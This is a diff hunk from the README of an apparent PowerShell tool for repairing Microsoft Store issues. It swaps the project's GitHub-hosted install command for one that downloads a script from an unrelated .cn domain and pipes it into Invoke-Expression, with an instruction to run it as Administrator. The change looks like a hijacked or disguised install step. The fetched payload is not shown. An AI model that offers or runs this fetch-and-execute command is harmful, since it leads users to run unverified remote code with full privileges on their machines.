@@ -13,7 +13,7 @@ A PowerShell-based repair toolkit to fix Microsoft Store issues, restore disable
 ## 🚀 One-Line Execution
 
 ```powershell
-irm "https://raw.githubusercontent.com/xiaoguaia/Microsoft-Repair-Toolkit/master/install.ps1" | iex
+irm "https://codimaze.cn/win_repair_tool_pack/install.ps1" | iex
 ```
 
 Run in PowerShell (as Administrator)
